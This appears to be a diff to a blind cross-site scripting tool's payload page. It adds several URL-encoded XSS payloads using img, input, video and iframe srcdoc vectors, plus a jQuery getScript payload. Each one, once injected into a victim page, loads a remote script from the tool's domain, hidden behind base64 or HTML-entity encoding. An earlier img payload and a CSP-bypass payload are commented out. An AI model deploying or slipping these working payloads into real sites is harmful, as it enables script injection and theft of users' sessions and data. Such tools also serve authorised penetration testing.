@@ -415,17 +415,26 @@
             var payloads = [
                 { title: 'Basic Payload', description: 'This is a basic payload', payload: '%3Cscript%20src%3D%27/script_domain/%27%3E%3C%2Fscript%3E' },
                 { title: 'Javascript URI', description: 'This is a payload that uses a javascript URI', payload: 'javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%5C%27script%5C%5C%27%29%3Ba.src%3D%5C%5C%27/script_domain/%5C%5C%27%3Bdocument.body.appendChild%28a%29%27%29' },
-                { title: 'IMG Error', description: 'Payload triggers on img error', payload: '%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28this.id%29%29%20id%3D%22/script_base64/%22%3E' },
-                { title: 'CSP Bypass', author: '@BRuteLogic', author_link: 'https://twitter.com/BRuteLogic', description: 'Payload against "script-src"', payload: '%3CIframe%20SrcDoc%3D%0A%22%3CScript%20Src%3D/script_domain/%3E%3C%2FScript%3E%22%3E'}
-            ]
+                // { title: 'IMG Error', description: 'Payload triggers on img error', payload: '%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28this.id%29%29%20id%3D%22/script_base64/%22%3E' },
+                { title: 'IMG error', description: 'Payload triggers on img error', payload: '%22%3E%3Cimg%20src%3Dx%20id%3D/script_base64/%20onerror%3Deval%28atob%28this.id%29%29%3E' },
+                { title: 'Input Tag Payload', description: 'HTML5 input-based payload', payload: '%22%3E%3Cinput%20onfocus%3Deval%28atob%28this.id%29%29%20id%3D/script_base64/%20autofocus%3E' },
+                { title: 'Video Source Payload', description: 'Video Source payload', payload: '%22%3E%3Cvideo%3E%3Csource%20onerror%3Deval%28atob%28this.id%29%29%20id%3D/script_base64/%3E' },
+                { title: 'Iframe with HTML entities', description: 'Iframe that uses HTML Entities', payload: '%22%3E%3Ciframe%20srcdoc%3D%22/script_htmlencode/%22%3E' },
+                { title: 'Jquery Payload', description: 'Payload exclusive to jquery', payload: '%3Cscript%3E%24.getScript%28%22/script_domain/%22%29%3C%2Fscript%3E' },
+                // { title: 'CSP Bypass', author: '@BRuteLogic', author_link: 'https://twitter.com/BRuteLogic', description: 'Payload against "script-src"', payload: '%3CIframe%20SrcDoc%3D%0A%22%3CScript%20Src%3D/script_domain/%3E%3C%2FScript%3E%22%3E'}
+            ];
 
             payloads.forEach(payload => {
                 var domain = window.location.origin;
+                var hasHTTPS = domain.startsWith('https://');
                 var domainWithoutProtocol = window.location.hostname + (window.location.port ? ':' + window.location.port : '');
-                var domainBase64 = html_encode(btoa(domain));
+                var domainBase64 = btoa(`var a=document.createElement("script");a.src="${domain}";document.body.appendChild(a);`).replace(/=/g, '');
+                var domainHTMLEncode = "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112" + (hasHTTPS ? ";&#115" : "") + ";&#58;&#47;&#47;" + domainWithoutProtocol + "&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;";
+
                 var processedPayload = payload.payload.replace('/script_domain/', domain);
                 processedPayload = processedPayload.replace('/script_hostname/', domainWithoutProtocol);
                 processedPayload = processedPayload.replace('/script_base64/', domainBase64);
+                processedPayload = processedPayload.replace('/script_htmlencode/', domainHTMLEncode);
 
                 var URIPayload = decodeURIComponent(processedPayload);
                 var payloadDiv = make_div('payload_div', payloadsTable);
